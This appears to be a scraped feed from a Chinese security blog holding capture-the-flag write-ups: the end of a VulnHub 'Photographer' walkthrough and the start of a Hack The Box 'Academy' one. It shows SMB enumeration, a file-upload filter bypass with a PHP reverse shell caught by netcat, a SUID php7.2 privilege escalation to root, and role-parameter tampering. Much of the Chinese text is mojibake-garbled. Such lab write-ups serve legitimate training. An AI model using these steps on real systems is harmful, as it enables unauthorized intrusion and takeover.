guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Nbtstat Information for 192.168.1.135    |</span><br><span class="line"> ============================================= </span><br><span class="line">Looking up status of 192.168.1.135</span><br><span class="line">        PHOTOGRAPHER    &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    Session Check on 192.168.1.135    |</span><br><span class="line"> ====================================== </span><br><span class="line">[+] Server 192.168.1.135 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"> ============================================ </span><br><span class="line">|    Getting domain SID for 192.168.1.135    |</span><br><span class="line"> ============================================ </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    OS information on 192.168.1.135    |</span><br><span class="line"> ======================================= </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info for 192.168.1.135 from smbclient: </span><br><span class="line">[+] Got OS info for 192.168.1.135 from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"> ============================== </span><br><span class="line">|    Users on 192.168.1.135    |</span><br><span class="line"> ============================== </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ========================================== </span><br><span class="line">|    Share Enumeration on 192.168.1.135    |</span><br><span class="line"> ========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.1.135</span><br><span class="line">//192.168.1.135/print$  Mapping: DENIED, Listing: N/A</span><br><span class="line">//192.168.1.135/sambashare      Mapping: OK, Listing: OK</span><br><span class="line">//192.168.1.135/IPC$    [E] Can&#x27;t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Password Policy Information for 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..........(çœç•¥éƒ¨åˆ†æ— å…³ç´§è¦çš„å†…å®¹)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.135    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Fri Dec 18 06:45:30 2020</span><br><span class="line"></span><br><span class="line">root@JIYE:~#</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥å‘ç°sambaæœåŠ¡çš„ä¸€ä¸ªç›®å½•sambashare</code></p><blockquote><p>//192.168.1.135/sambashare      Mapping: OK, Listing: OK</p></blockquote><p><code>åŒ¿åç›´æ¥è¿æ¥è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°ä¸€ä¸ªwordpressç«™ç‚¹çš„å¤‡ä»½æ–‡ä»¶å’Œä¸€ä¸ªtxtæ–‡ä»¶</code></p><img src="/2020/12/18/Photographer/image-20201218195708592.png" class><p><code>æ ¹æ®æ–‡ä»¶åmailsent.txtæ–‡ä»¶æ˜¯ä¸€å°å‘é€çš„é‚®ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°é‚®ç®±ä¸ºdaisa@photographer.com</code></p><p><code>è¿˜æœ‰é‚®ä»¶å†…å®¹ä¸ºä½ çš„ç½‘ç«™ç°åœ¨å‡†å¤‡å¥½äº†ï¼Œä¸è¦å¿˜è®°ä½ çš„å¯†ç my babygirl</code></p><p><code>è¿™é‡Œæ¨æµ‹å¯†ç ä¸ºbabygirlï¼Œæ‰€ä»¥å°è¯•ç™»å…¥ï¼ŒOKæ¨æµ‹æ­£ç¡®</code></p><img src="/2020/12/18/Photographer/image-20201218200838692.png" class><h2 id="0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"><a href="#0x08-ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell" class="headerlink" title="0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell"></a>0x08.ä¸Šä¼ æ–‡ä»¶ï¼Œåå¼¹shell</h2><p><code>æœ¬æ¬¡ä½¿ç”¨kaliè‡ªå¸¦reverse shellè·¯å¾„(/usr/share/webshells/php/php-reverse-shell.php)</code></p><p><code>å°†IPä¿®æ”¹ä¸ºkaliæœ¬èº«ï¼Œç«¯å£ä¸º6666</code></p><img src="/2020/12/18/Photographer/image-20201218201703596.png" class><p><code>ä¸Šä¼ </code></p><img src="/2020/12/18/Photographer/image-20201218202118418.png" class><p><code>ç»“æœä»…ä»…å¯ä»¥ä¸Šä¼ JPGã€PNGã€GIFã€MP4æ ¼å¼æ–‡ä»¶ï¼Œæ‰€ä»¥å…ˆä¿®æ”¹æ–‡ä»¶åç¼€</code></p><img src="/2020/12/18/Photographer/image-20201218202345783.png" class><p><code>è¿›è¡Œä¸Šä¼ </code></p><img src="/2020/12/18/Photographer/image-20201218202606655.png" class><p><code>æŠ“åŒ…å°†åç¼€æ”¹å›php</code></p><img src="/2020/12/18/Photographer/image-20201218203003281.png" class><p><code>kaliç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç‚¹å‡»åå¼¹shell</code></p><img src="/2020/12/18/Photographer/image-20201218203246226.png" class><img src="/2020/12/18/Photographer/image-20201218203335202.png" class><p><code>æˆåŠŸget shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.135] 56236</span><br><span class="line">Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 15:33:07 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><p><code>é¦–å…ˆå‡çº§shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>å‡çº§äº¤äº’shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line">www-data@photographer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>åœ¨daisaæ‰¾åˆ°user.txtçš„flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ cat user.txt </span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><code>suidææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥å‘ç°php7.2å¯ä»¥åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/php7.2</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGhwLw==">ææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>æ‰¾åˆ°php7.2å‘½ä»¤çš„ç›®å½•ï¼Œåœ¨/usr/bin/php7.2</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/$ whereis php7.2</span><br><span class="line">php7: /usr/bin/php7.2 /usr/share/php7.2-mysql /usr/share/php7.2-opcache /usr/share/php7.2-xmlrpc /usr/share/php7.2-json /usr/share/php7.2-readline /usr/share/php7.2-curl /usr/share/php7.2-common /usr/share/php7.2-sqlite3 /usr/share/php7.2-zip /usr/share/php7.2-intl /usr/share/php7.2-xml /usr/share/php7.2-gd /usr/share/php7.2-mbstring</span><br><span class="line">www-data@photographer:/$ </span><br></pre></td></tr></table></figure><p><code>exploit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/usr/bin$ ./php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment"># id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~  </span></span><br><span class="line">/bin/sh: 5: cd: can&#x27;t cd to ~</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat proof.txt</span></span><br><span class="line">                                                                   </span><br><span class="line">                                .:/://::::///:-`                                </span><br><span class="line">                            -/++:+`:--:o:  oo.-/+/:`                            </span><br><span class="line">                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         </span><br><span class="line">                       :o:``oyo/o`. `      ```/-so:+--+/`                       </span><br><span class="line">                     -o:-`yh//.                 `./ys/-.o/                      </span><br><span class="line">                    ++.-ys/:/y-                  /s-:/+/:/o`                    </span><br><span class="line">                   o/ :yo-:hNN                   .MNs./+o--s`                   </span><br><span class="line">                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   </span><br><span class="line">                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  </span><br><span class="line">                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  </span><br><span class="line">                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 </span><br><span class="line">                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  </span><br><span class="line">                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  </span><br><span class="line">                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   </span><br><span class="line">                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    </span><br><span class="line">                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     </span><br><span class="line">                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       </span><br><span class="line">                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         </span><br><span class="line">                           -/+/-:-/y+/d:yh-o:+--/+/:`                           </span><br><span class="line">                              `-///////////////:`                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http://v1n1v131r4.com</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[academy]</title>
    <link href="https://lunamoore.github.io/2020/12/09/HTB-academy/"/>
    <id>https://lunamoore.github.io/2020/12/09/HTB-academy/</id>
    <published>2020-12-09T11:54:07.000Z</published>
    <updated>2020-12-09T12:00:20.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/12/09/HTB-academy/image-20201209140730144.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†22ã€80ç«¯å£ï¼ŒåŸŸåä¸ºacademy.htbåŠæœåŠ¡å™¨ç­‰ä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# nmap -sC -sV -sT 10.10.10.215 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 01:02 EST</span><br><span class="line">Nmap scan report for academy.htb (10.10.10.215)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)</span><br><span class="line">|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)</span><br><span class="line">|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Hack The Box Academy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.43 seconds</span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>é¦–å…ˆæ·»åŠ ä¸€æ¡hosts [10.10.10.215    academy.htb]ï¼Œå‘ç°ä¸€ä¸ªç™»å…¥ä¸ä¸€ä¸ªæ³¨å†Œæ¡†</code></p><img src="/2020/12/09/HTB-academy/image-20201209144619918.png" class><p><code>æ³¨å†Œä¸€ä¸ªè´¦å·å¹¶ç™»å…¥ï¼Œæ‰‹åŠ¨çˆ¬è™«ï¼Œæ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯</code></p><img src="/2020/12/09/HTB-academy/image-20201209151326705.png" class><h2 id="0x03-åˆ—å‡ºç›®å½•ï¼ˆ403-404ï¼‰"><a href="#0x03-åˆ—å‡ºç›®å½•ï¼ˆ403-404ï¼‰" class="headerlink" title="0x03.åˆ—å‡ºç›®å½•ï¼ˆ403/404ï¼‰"></a>0x03.åˆ—å‡ºç›®å½•ï¼ˆ403/404ï¼‰</h2><p><code>ä½¿ç”¨wfuzzè¿›è¡Œæ¨¡ç³Šæµ‹è¯•</code></p><blockquote><p>å¾—åˆ°ä»¥ä¸‹ç›®å½•</p><p>config</p><p>admin</p><p>index</p><p>home</p><p>login</p><p>register</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# wfuzz -u http://academy.htb/FUZZ.php -w /usr/share/wordlists/dirb/small.txt --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http://academy.htb/FUZZ.php</span><br><span class="line">Total requests: 959</span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line">000000213:   200        0 L      0 W      0 Ch        &quot;config&quot;</span><br><span class="line">000000059:   200        141 L    227 W    2633 Ch     &quot;admin&quot;</span><br><span class="line">000000434:   200        76 L     131 W    2117 Ch     &quot;index&quot;</span><br><span class="line">000000411:   302        1049 L   4114 W   55034 Ch    &quot;home&quot;</span><br><span class="line">000000498:   200        141 L    226 W    2627 Ch     &quot;login&quot; </span><br><span class="line">000000684:   200        148 L    247 W    3003 Ch     &quot;register&quot;                    </span><br><span class="line">Total time: 9.694324</span><br><span class="line">Processed Requests: 959</span><br><span class="line">Filtered Requests: 953</span><br><span class="line">Requests/sec.: 98.92385</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x04-æŸ¥çœ‹registerç›®å½•æºç "><a href="#0x04-æŸ¥çœ‹registerç›®å½•æºç " class="headerlink" title="0x04.æŸ¥çœ‹registerç›®å½•æºç "></a>0x04.æŸ¥çœ‹registerç›®å½•æºç </h2><p><code>å‘ç°äº†éšè—åŸŸ</code></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Ny9hcnRpY2xlL2RldGFpbHMvMTAzNjYwNzQz">éšè—åŸŸå‚è€ƒ1<i class="fa fa-external-link-alt"></i></span></strong></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVzaHVpY29uZ3NoZW5nL2FyY2hpdmUvMjAxMS8wNS8wOS8yMDQwOTk0Lmh0bWw=">éšè—åŸŸå‚è€ƒ2<i class="fa fa-external-link-alt"></i></span></strong></p><img src="/2020/12/09/HTB-academy/image-20201209171550454.png" class><h2 id="0x05-bpæŠ“åŒ…"><a href="#0x05-bpæŠ“åŒ…" class="headerlink" title="0x05.bpæŠ“åŒ…"></a>0x05.bpæŠ“åŒ…</h2><p><code>ä¿®æ”¹roleidçš„å€¼ä¸º1ï¼Œå‘åå°ä¼ å€¼ï¼Œä¸”ç”¨æˆ·ååä¹Ÿéœ€è¦åŠ 1ï¼›å‘é€ï¼ŒhttpçŠ¶æ€ç éœ€è¦ä¸º200</code></p><img src="/2020/12/09/HTB-academy/image-20201209171903646.png" class><h2 id="0x06-è®¿é—®adminç›®å½•"><a href="#0x06-è®¿é—®adminç›®å½•" class="headerlink" title="0x06.è®¿é—®adminç›®å½•"></a>0x06.è®¿é—®adminç›®å½•</h2><h3 id="1-demo1ç™»å…¥"><a href="#1-demo1ç™»å…¥" class="headerlink" title="1.demo1ç™»å…¥"></a>1.demo1ç™»å…¥</h3><img src="/2020/12/09/HTB-academy/image-20201209172159741.png" class><h3 id="2-ç™»å…¥æˆåŠŸ"><a href="#2-ç™»å…¥æˆåŠŸ" class="headerlink" title="2.ç™»å…¥æˆåŠŸ"></a>2.ç™»å…¥æˆåŠŸ</h3><p><code>å¯ä»¥çœ‹åˆ°è§£å†³dev-staging-01.academy.htbçš„é—®é¢˜åœ¨æ¨è¿Ÿä¸­ï¼Œä¸ä¸¤ä¸ªç”¨æˆ·</code></p><blockquote><p>cry0I1t3</p><p>mrb3n</p></blockquote><img src="/2020/12/09/HTB-academy/image-20201209182821986.png" class><h3 id="3-è®¿é—®dev-staging-01-academy-htbï¼ˆéœ€æ·»åŠ hostsï¼‰"><a href="#3-è®¿é—®dev-staging-01-academy-htbï¼ˆéœ€æ·»åŠ hostsï¼‰" class="headerlink" title="3.è®¿é—®dev-staging-01.academy.htbï¼ˆéœ€æ·»åŠ 